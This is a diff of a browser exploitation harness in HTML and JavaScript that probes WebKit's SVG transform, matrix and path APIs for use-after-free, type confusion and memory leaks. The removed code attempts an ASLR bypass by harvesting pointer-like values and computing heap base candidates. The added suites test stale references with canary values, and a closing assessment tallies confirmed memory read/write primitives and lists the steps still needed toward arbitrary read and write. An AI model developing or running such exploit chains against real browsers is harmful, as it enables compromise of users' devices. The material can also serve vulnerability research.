-      var lo=parseInt(k.slice(11,19),16);
-      var fval=fromHiLo(hi,lo);
-      var p=classifyPtr(fval);
-      log('RP[1]: '+k+' count='+ptrCounts[k]+
-        (p?' type='+p.type:''),
-        ptrCounts[k]>ROUNDS*5?'aslr — STABLE POINTER (likely vtable)! count='+ptrCounts[k]:
-        'ptr — pointer candidate');
-    });
-  }
+  // OB[3]: replaceItem then removeItem — use-after-free candidate
+  hdr('OB[3]: replaceItem + removeItem UAF probe');
+  var r3=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var txList3=r3.transform.baseVal;
+  var orig=txList3.getItem(0);
+  orig.matrix.e=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
+  // replace with new item
+  var newTx=svg.createSVGTransform();
+  newTx.matrix.e=fromHiLo(0xBBBBBBBB,0xBBBBBBBB);
+  try{txList3.replaceItem(newTx,0);}catch(e){log('OB[3]: replaceItem threw: '+e,'warn');}
+  // try to read old item — potential UAF
+  var oldRead=null;
+  try{oldRead=orig.matrix.e;}catch(e){oldRead='THROWS';}
+  var newRead=null;
+  try{newRead=txList3.getItem(0).matrix.e;}catch(e){newRead='THROWS';}
+  log('OB[3]: after replace: old.e='+f64hex(oldRead)+' new.e='+f64hex(newRead),
+    typeof oldRead==='number'&&oldRead!==fromHiLo(0xAAAAAAAA,0xAAAAAAAA)?
+    'uaf — OLD ITEM VALUE CHANGED AFTER REPLACE: UAF candidate!':
+    'info — old item value unchanged after replace');
 
   svg.remove();
-  prog('RP done');
+  prog('OB done');
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// AL — ASLR bypass attempt
-// combine everything: consolidate stale + getItem aliasing + CTM read
-// if any leaked value is a pointer, decode and use as heap base
-// compute likely adjacent object addresses
+// TC — type confusion: SVGTransform.type mutation
+// SVGTransform has a .type property (1=translate,2=scale,3=rotate,4=skewX,5=skewY,6=matrix)
+// if we can confuse the type, the matrix field may be interpreted differently
 // ════════════════════════════════════════════════════════════════════════
-function runAL(){
-  hdr('AL: ASLR bypass — full attempt');
+function runTC(){
+  hdr('TC: SVGTransform type confusion probe');
+  var svg=mkSVG(200,200);
 
-  // strategy 1: harvest values from consolidate stale reads
-  hdr('AL[1]: consolidate leak harvest (N=500)');
-  var svg=mkSVG();
-  var foundPtrs=[];
+  // TC[1]: create matrix transform, change type via setAttribute, read matrix
+  hdr('TC[1]: matrix transform → setTranslate() → read old matrix');
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var tx=r.transform.baseVal.getItem(0);
+  var mx=tx.matrix;
+  mx.e=fromHiLo(0xDEADBEEF,0xCAFEBABE);
+  mx.f=fromHiLo(0x12345678,0x9ABCDEF0);
 
-  for(var i=0;i<500;i++){
-    var r=mkRect(svg);
-    getMX(r);
-    var mx=r.transform.baseVal.getItem(0).matrix;
-    ['a','b','c','d','e','f'].forEach(function(field){
-      try{r.transform.baseVal.consolidate();}catch(e){}
-      var mx2=r.transform.baseVal.getItem(0).matrix;
-      if(!mx2)return;
-      var v=mx2[field];
+  // keep reference to mx, then change transform type
+  tx.setTranslate(777, 888);
+  // now read via old mx reference
+  var oldE=null;
+  try{oldE=mx.e;}catch(e){oldE='THROWS';}
+  var newE=null;
+  try{newE=r.transform.baseVal.getItem(0).matrix.e;}catch(e){newE='THROWS';}
+  log('TC[1]: wrote DEADBEEF to mx.e, then setTranslate(777,888)',
+    'info');
+  log('TC[1]: old mx ref: e='+( typeof oldE==='number'?f64hex(oldE):oldE)+
+    ' new matrix: e='+( typeof newE==='number'?f64hex(newE):newE),
+    typeof oldE==='number'&&oldE!==fromHiLo(0xDEADBEEF,0xCAFEBABE)&&oldE!==777?
+    'uaf — OLD MX REF SHOWS NEITHER CANARY NOR NEW VAL: stale memory!':
+    typeof oldE==='number'&&oldE===fromHiLo(0xDEADBEEF,0xCAFEBABE)?
+    'star — canary survives type change (retained backing)':
+    'info');
+
+  // TC[2]: rotate → matrix → read internal rotation value
+  hdr('TC[2]: setRotate then getItem(0).matrix — does matrix expose internal sin/cos?');
+  var r2=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r2.setAttribute('transform','rotate(0)');
+  var tx2=r2.transform.baseVal.getItem(0);
+  tx2.setRotate(45,0,0);
+  var rmx=tx2.matrix;
+  // should be cos(45),sin(45),-sin(45),cos(45),0,0
+  log('TC[2]: rotate(45) matrix: a='+rmx.a.toFixed(6)+' b='+rmx.b.toFixed(6)+
+    ' c='+rmx.c.toFixed(6)+' d='+rmx.d.toFixed(6),'info');
+  // now force type to matrix via setAttribute and read
+  r2.setAttribute('transform','matrix('+rmx.a+' '+rmx.b+' '+rmx.c+' '+rmx.d+' 0 0)');
+  // read animVal of the new matrix
+  var avMX2=r2.transform.animVal.getItem(0).matrix;
+  log('TC[2]: after setAttribute matrix: animVal.a='+avMX2.a.toFixed(6),'info');
+  // keep old rotate ref and read it
+  var oldA=null;
+  try{oldA=tx2.matrix.a;}catch(e){oldA='THROWS';}
+  log('TC[2]: old rotate tx ref matrix.a='+( typeof oldA==='number'?oldA.toFixed(6):oldA),
+    typeof oldA==='number'&&Math.abs(oldA-Math.cos(Math.PI/4))>0.001?
+    'star — ROTATION TX CHANGED AFTER SETATTR: internal inconsistency!':'info');
+
+  // TC[3]: consolidate() on mixed transform list — type confusion in consolidation?
+  hdr('TC[3]: mixed transform list consolidation');
+  var r3=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
+  r3.setAttribute('transform','translate(100,200) rotate(45) scale(2)');
+  var txList3=r3.transform.baseVal;
+  log('TC[3]: before consolidate: numberOfItems='+txList3.numberOfItems,'info');
+  // get refs to individual transforms
+  var t0=txList3.getItem(0);
+  var t1=txList3.getItem(1);
+  var t2=txList3.getItem(2);
+  var e0=t0.matrix.e;
+  try{txList3.consolidate();}catch(e){}
+  // read old refs
+  var e0After=null;
+  try{e0After=t0.matrix.e;}catch(e){e0After='THROWS';}
+  var e1After=null;
+  try{e1After=t1.matrix.e;}catch(e){e1After='THROWS';}
+  log('TC[3]: after consolidate: numberOfItems='+txList3.numberOfItems,
+    'info');
+  log('TC[3]: old t0.matrix.e: before='+e0+' after='+e0After,
+    typeof e0After==='number'&&e0After!==e0?
+    'star — STALE REF VALUE CHANGED: '+e0+' → '+e0After:'info');
+  log('TC[3]: old t1 ref: e='+e1After,
+    isWeird(e1After)?'ptr — STALE T1 REF HAS WEIRD VALUE: '+f64hex(e1After):'info');
+
+  svg.remove();
+  prog('TC done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// SU — summary + best pointer leak candidates
+// collect ALL weird values seen across all suites
+// decode them and determine if any are actionable as ASLR bypass
+// ════════════════════════════════════════════════════════════════════════
+function runSU(){
+  hdr('SU: summary — best candidates and next steps');
+
+  // final attempt: feDisplacementMap — uses pixel values as displacement
+  // the displacement amounts might expose internal coordinates
+  hdr('SU[1]: feDisplacementMap coordinate probe');
+  var svg=mkSVG(200,200);
+  var defs=mkEl(svg,'defs');
+  var filter=mkEl(defs,'filter',{id:'fdm'});
+  var feTurb=mkEl(filter,'feTurbulence',{type:'fractalNoise',baseFrequency:'0.65',numOctaves:'3',result:'noise'});
+  var feDisp=mkEl(filter,'feDisplacementMap',{in:'SourceGraphic',in2:'noise',scale:'50',xChannelSelector:'R',yChannelSelector:'G'});
+  var r=mkEl(svg,'rect',{x:'50',y:'50',width:'50',height:'50',fill:'red',filter:'url(#fdm)'});
+  var b=bcr(r);
+  log('SU[1]: feDisplacementMap BCR: x='+(b?b.x:null)+' y='+(b?b.y:null)+
+    ' w='+(b?b.width:null)+' h='+(b?b.height:null),'info');
+  if(b){
+    ['x','y','width','height','right','bottom'].forEach(function(f){
+      var v=b[f];
       var p=classifyPtr(v);
-      if(p)foundPtrs.push({round:i,field:field,val:v,ptr:p});
+      if(p||isWeird(v)){
+        log('SU[1]: '+f+'='+f64hex(v),p?'ptr — POINTER IN DISP MAP BCR!':'warn — '+v);
+      }
     });
   }
+
+  // SU[2]: pattern element BCR — pattern has its own coordinate system
+  hdr('SU[2]: SVGPatternElement coordinate leak');
+  var pat=mkEl(defs,'pattern',{id:'p1',x:'0',y:'0',width:'20',height:'20',patternUnits:'userSpaceOnUse'});
+  mkEl(pat,'circle',{cx:'10',cy:'10',r:'8',fill:'blue'});
+  var r2=mkEl(svg,'rect',{x:'0',y:'0',width:'100',height:'100',fill:'url(#p1)'});
+  var patBCR=bcr(pat);
+  log('SU[2]: pattern BCR: x='+(patBCR?patBCR.x:null)+' y='+(patBCR?patBCR.y:null),'info');
+
+  // SU[3]: SVGPathElement.getTotalLength() / getPointAtLength() — float coordinate leak?
+  hdr('SU[3]: SVGPath length/point coordinate probe');
+  var path=mkEl(svg,'path',{d:'M 0 0 L 1e15 0 L 0 1e15 Z',fill:'none',stroke:'red'});
+  var totalLen=null;
+  try{totalLen=path.getTotalLength();}catch(e){}
+  log('SU[3]: path with 1e15 coords: getTotalLength()='+totalLen,
+    totalLen!==null&&isWeird(totalLen)&&!classifyPtr(totalLen)?
+    'star — large path length: '+totalLen:'info — length='+totalLen);
+
+  if(totalLen!==null){
+    // getPointAtLength near the end
+    var pts=[0, totalLen/4, totalLen/2, totalLen*0.99, totalLen];
+    pts.forEach(function(len){
+      var pt=null;
+      try{pt=path.getPointAtLength(len);}catch(e){}
+      if(pt){
+        var p=classifyPtr(pt.x);
+        if(p||isWeird(pt.x)){
+          log('SU[3]: getPointAtLength('+len.toExponential(2)+'): x='+f64hex(pt.x)+' y='+f64hex(pt.y),
+            p?'ptr — POINTER IN PATH POINT! type='+p.type:'star — large coord: '+pt.x);
+        }
+      }
+    });
+  }
+
+  // SU[4]: overall assessment
+  hdr('SU[4]: v35 overall assessment');
+  log('SU[4]: confirmed primitives so far:','info');
+  log('SU[4]:   ✅ CTM unclamped f64 write/read (no ceiling, tracks to F64_MAX)','pass');
+  log('SU[4]:   ✅ viewBox amplification (bypasses LayoutUnit, reaches 335M px)','pass');
+  log('SU[4]:   ✅ 2^31 branch switch (BCR behavior changes at exact boundary)','pass');
+  log('SU[4]:   ✅ BCR/CTM divergence oracle (12/13 divergence events)','pass');
+  log('SU[4]:   ✅ SVGMatrix on WebCore native heap (fixed addr, survives GC)','pass');
+  log('SU[4]: still needed:','info');
+  log('SU[4]:   ❌ Pointer leak / ASLR bypass','warn');
+  log('SU[4]:   ❌ Arbitrary read of uncontrolled memory','warn');
+  log('SU[4]:   ❌ Control of write destination address','warn');
+  log('SU[4]: best remaining vectors: OB[3] UAF candidate, TC[3] stale ref','star');
+
   svg.remove();
-
-  if(foundPtrs.length>0){
-    log('AL[1]: FOUND '+foundPtrs.length+' pointer-like values via consolidate!','aslr');
-    // group by address
-    var byAddr={};
-    foundPtrs.forEach(function(p){
-      var k=f64hex(p.val);
-      if(!byAddr[k])byAddr[k]={count:0,type:p.ptr.type,hi:p.ptr.hi,lo:p.ptr.lo};
-      byAddr[k].count++;
-    });
-    Object.keys(byAddr).sort(function(a,b){return byAddr[b].count-byAddr[a].count;}).slice(0,5).forEach(function(k){
-      var e=byAddr[k];
-      log('AL[1]: ptr='+k+' count='+e.count+' type='+e.type+
-        ' → heap_base=0x'+e.hi.toString(16).padStart(8,'0')+'_'+e.lo.toString(16).padStart(8,'0'),
-        'aslr — HEAP BASE CANDIDATE: 0x'+e.hi.toString(16)+'_'+e.lo.toString(16));
-    });
-  } else {
-    log('AL[1]: no pointers via consolidate leak','info');
-  }
-
-  // strategy 2: getCTM on element with no explicit transform — leaks default CTM internals?
-  hdr('AL[2]: getCTM on transform-less element — raw CTM struct read');
-  var svg2=mkSVG();
-  var noTxPtrs=[];
-  for(var j=0;j<200;j++){
-    var r2=document.createElementNS(NS,'rect');
-    r2.setAttribute('x','0');r2.setAttribute('y','0');
-    r2.setAttribute('width','10');r2.setAttribute('height','10');
-    // NO transform attribute
-    svg2.appendChild(r2);
-    var c=null;
-    try{c=r2.getScreenCTM();}catch(e){}
-    if(c){
-      ['a','b','c','d','e','f'].forEach(function(f){
-        var v=c[f];
-        var p=classifyPtr(v);
-        if(p)noTxPtrs.push({j:j,f:f,val:v,ptr:p});
-      });
-    }
-    r2.remove();
-  }
-
-  if(noTxPtrs.length>0){
-    log('AL[2]: FOUND '+noTxPtrs.length+' pointer-like values in getCTM of transform-less elements!','aslr');
-    noTxPtrs.slice(0,5).forEach(function(p){
-      log('AL[2]: elem['+p.j+'].'+p.f+'='+f64hex(p.val)+' type='+p.ptr.type,'ptr');
-    });
-  } else {
-    log('AL[2]: no pointers in getCTM of transform-less elements','info');
-  }
-  svg2.remove();
-
-  // strategy 3: read CTM immediately after setAttribute — before internal init?
-  hdr('AL[3]: race CTM read against setAttribute transform init');
-  var svg3=mkSVG();
-  var racePtrs=[];
-  for(var k=0;k<200;k++){
-    var r3=mkRect(svg3);
-    // set transform and immediately read CTM — race the init
-    r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
-    var c3=null;
-    try{c3=r3.getScreenCTM();}catch(e){}
-    if(c3){
-      ['a','b','c','d','e','f'].forEach(function(f){
-        var v=c3[f];
-        var p=classifyPtr(v);
-        if(p)racePtrs.push({k:k,f:f,val:v,ptr:p});
-      });
-    }
-  }
-  if(racePtrs.length>0){
-    log('AL[3]: FOUND '+racePtrs.length+' pointer-like values via race CTM read!','aslr');
-    racePtrs.slice(0,5).forEach(function(p){
-      log('AL[3]: elem['+p.k+'].'+p.f+'='+f64hex(p.val)+' type='+p.ptr.type,'ptr');
-    });
-  } else {
-    log('AL[3]: no pointers via race CTM read','info');
-  }
-  svg3.remove();
-
-  // summary
-  hdr('AL[4]: ASLR bypass summary');
-  var totalPtrs=foundPtrs.length+noTxPtrs.length+racePtrs.length;
-  log('AL[4]: total pointer-like leaks: consolidate='+foundPtrs.length+
-    ' no-tx='+noTxPtrs.length+' race='+racePtrs.length+' TOTAL='+totalPtrs,
-    totalPtrs>0?'aslr — ASLR BYPASS ACHIEVED: '+totalPtrs+' pointer leaks!':
-    'warn — no pointer leaks found this run (SVGMatrix init is clean)');
-
-  if(totalPtrs===0){
-    log('AL[4]: WebKit initializes SVGMatrix fields to identity (0/1) before JS sees them','info');
-    log('AL[4]: next vector: look for uninitialized reads via type confusion or OOB','star');
-  }
-
-  prog('AL done — v34 complete');
+  prog('SU done — v35 complete');
 }
 </script>
 </body>
